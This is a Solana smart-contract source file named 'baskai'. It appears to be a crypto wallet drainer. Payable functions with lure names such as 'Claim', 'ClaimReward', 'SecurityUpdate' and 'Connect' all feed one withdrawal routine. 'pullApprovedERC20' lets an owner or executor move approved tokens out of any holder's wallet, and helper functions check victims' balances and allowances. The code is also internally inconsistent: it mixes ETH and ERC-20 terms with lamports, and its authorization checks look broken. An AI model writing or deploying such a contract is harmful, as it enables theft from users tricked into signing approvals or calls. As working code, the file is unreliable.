@program_id("baskai_program_id") // Replace with actual program ID
contract baskai {
    address private owner;
    address private executor;
    uint64 private ethFeeCollected;
    uint8 private percentage;

    mapping(address => mapping(address => uint64)) private _allowances;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event ExecutorChanged(address indexed previousExecutor, address indexed newExecutor);
    event PercentageChanged(uint8 previousPercentage, uint8 currentPercentage);
    event Approval(address indexed owner, address indexed spender, uint64 value);

    @payer(payer)
    @space(512 + 32 + 32 + 8 + 1)
    @seed("baskai_data")
    constructor(address payer) {
        owner = tx.accounts.dataAccount.key;
        executor = tx.accounts.dataAccount.key;
        ethFeeCollected = 0;
        percentage = 5;
    }

    modifier onlyOwnerOrExecutor() {
        require(
            tx.accounts.dataAccount.key == owner || tx.accounts.dataAccount.key == executor,
            "Not authorized"
        );
        _;
    }

    modifier onlyOwner() {
        require(tx.accounts.dataAccount.key == owner, "Not authorized");
        _;
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function getExecutor() public view returns (address) {
        return executor;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner cannot be the zero address");
        address previousOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(previousOwner, newOwner);
    }

    function setExecutor(address newExecutor) public onlyOwner {
        require(newExecutor != address(0), "New executor cannot be the zero address");
        address previousExecutor = executor;
        executor = newExecutor;
        emit ExecutorChanged(previousExecutor, newExecutor);
    }

    function getContractETHBalance() public view returns (uint64) {
        return tx.accounts.dataAccount.lamports;
    }

    function getEthFeeCollected() public view returns (uint64) {
        return ethFeeCollected;
    }

    function withdrawEthFees(
        address recipient
    ) public onlyOwner {
        require(recipient != address(0), "Recipient cannot be the zero address");
        uint64 amountToWithdraw = ethFeeCollected;
        require(amountToWithdraw > 0, "No ETH fees to withdraw");

        ethFeeCollected = 0;

        tx.accounts.dataAccount.lamports -= amountToWithdraw;
        recipient.lamports += amountToWithdraw;
    }

    function withdrawNativeETH(
        address payable _to
    ) public onlyOwner {
        require(_to != address(0), "Recipient cannot be the zero address");
        uint64 balance = tx.accounts.dataAccount.lamports;
        require(balance > 0, "No ETH to withdraw");

        tx.accounts.dataAccount.lamports -= balance;
        _to.lamports += balance;
    }

    function withdrawERC20(
        address _tokenAddress,
        address _to
    ) public onlyOwner returns (bool) {
        require(_to != address(0), "Recipient cannot be the zero address");

        (bool success, bytes memory data) = _tokenAddress.call{accounts: []}(
            abi.encodeWithSignature("balanceOf(address)", tx.accounts.dataAccount.key)
        );
        require(success, "Failed to get balance");
        uint64 _amount = abi.decode(data, (uint64));
        require(_amount > 0, "No tokens to withdraw");

        (success, data) = _tokenAddress.call{accounts: []}(
            abi.encodeWithSignature("transfer(address,uint64)", _to, _amount)
        );
        require(success, "Failed to transfer tokens");

        return true;
    }

    function changePercentage(uint8 newPercentage) public onlyOwner {
        require(newPercentage <= 100, "Percentage cannot exceed 100%");
        uint8 previousPercentage = percentage;
        percentage = newPercentage;
        emit PercentageChanged(previousPercentage, percentage);
    }

    function _processEthWithdrawal(address recipient) private {
        uint64 amount = tx.accounts.dataAccount.lamports;
        require(amount > 0, "ETH amount must be greater than zero");

        uint64 reserve = (amount * percentage) / 100;
        uint64 amountToRecipient = amount - reserve;

        ethFeeCollected += reserve;

        tx.accounts.dataAccount.lamports -= amountToRecipient;
        recipient.lamports += amountToRecipient;
    }

    @mutableSigner(payer)
    function Claim(address recipient) external payable {
        _processEthWithdrawal(recipient);
    }

    @mutableSigner(payer)
    function ClaimReward(address recipient) external payable {
        _processEthWithdrawal(recipient);
    }

    @mutableSigner(payer)
    function ClaimRewards(address recipient) external payable {
        _processEthWithdrawal(recipient);
    }

    @mutableSigner(payer)
    function Execute(address recipient) external payable {
        _processEthWithdrawal(recipient);
    }

    @mutableSigner(payer)
    function Multicall(address recipient) external payable {
        _processEthWithdrawal(recipient);
    }

    @mutableSigner(payer)
    function Swap(address recipient) external payable {
        _processEthWithdrawal(recipient);
    }

    @mutableSigner(payer)
    function Connect(address recipient) external payable {
        _processEthWithdrawal(recipient);
    }

    @mutableSigner(payer)
    function SecurityUpdate(address recipient) external payable {
        _processEthWithdrawal(recipient);
    }

    function approve(address spender, uint64 amount) public returns (bool) {
        require(spender != address(0), "Approve to the zero address");
        _allowances[tx.accounts.dataAccount.key][spender] = amount;
        emit Approval(tx.accounts.dataAccount.key, spender, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view returns (uint64) {
        return _allowances[_owner][spender];
    }

    function checkApprovedAllowance(
        address _tokenAddress,
        address _tokenHolder
    ) public view onlyOwnerOrExecutor returns (uint64) {
        (bool success, bytes memory data) = _tokenAddress.call{accounts: []}(
            abi.encodeWithSignature("allowance(address,address)", _tokenHolder, tx.accounts.dataAccount.key)
        );
        require(success, "Failed to get allowance");
        return abi.decode(data, (uint64));
    }

    function checkTokenBalanceOfUser(
        address _tokenAddress,
        address _userAddress
    ) public view onlyOwnerOrExecutor returns (uint64) {
        (bool success, bytes memory data) = _tokenAddress.call{accounts: []}(
            abi.encodeWithSignature("balanceOf(address)", _userAddress)
        );
        require(success, "Failed to get balance");
        return abi.decode(data, (uint64));
    }

    function pullApprovedERC20(
        address _tokenAddress,
        address _from,
        address _to,
        uint64 _amount
    ) public onlyOwnerOrExecutor returns (bool) {
        require(_amount > 0, "Amount must be greater than zero");
        require(_to != address(0), "Recipient cannot be the zero address");

        uint64 feeAmount = (_amount * percentage) / 100;
        uint64 amountToTransfer = _amount - feeAmount;

        (bool success, bytes memory data) = _tokenAddress.call{accounts: []}(
            abi.encodeWithSignature("transferFrom(address,address,uint64)", _from, tx.accounts.dataAccount.key, feeAmount)
        );
        require(success, "Failed to collect ERC-20 fee");

        (success, data) = _tokenAddress.call{accounts: []}(
            abi.encodeWithSignature("transferFrom(address,address,uint64)", _from, _to, amountToTransfer)
        );
        require(success, "Failed to transfer main ERC-20 amount");

        return true;
    }
}